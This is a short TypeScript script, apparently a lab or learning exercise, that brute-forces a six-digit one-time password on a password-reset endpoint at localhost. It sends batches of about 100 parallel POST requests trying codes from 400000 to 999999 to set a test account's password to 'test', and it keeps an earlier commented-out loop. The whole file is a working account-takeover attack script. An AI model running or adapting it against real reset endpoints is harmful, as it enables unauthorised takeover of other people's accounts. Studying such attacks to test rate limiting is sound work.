var axios = require("axios").default;

async function sendRequest(otp:string){
    var options = {
        method: 'POST',
        url: 'http://localhost:3000/reset-password',
        headers: {
            Accept: '*/*',
            'User-Agent': 'Thunder Client (https://www.thunderclient.com)',
            'Content-Type': 'application/json'
        },
        data: {email: 'test@gmail.com', newPassword: 'test', otp: otp}
    };
    
    try{
        await axios.request(options);
    }catch(err){

    }
}

// Just throwing number to check for the otp
// for(let i=140049;i<=140150;i++){
//     console.log(i);
//     sendRequest(i.toString());
// }
// sendRequest("698224");

// batching

async function main(){
    for(let i=400000;i<=999999;i+=100){
        const p=[]; // to keep the Promise
        console.log(i);
        for(let j=0;j<=100;j++){
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
}

main();
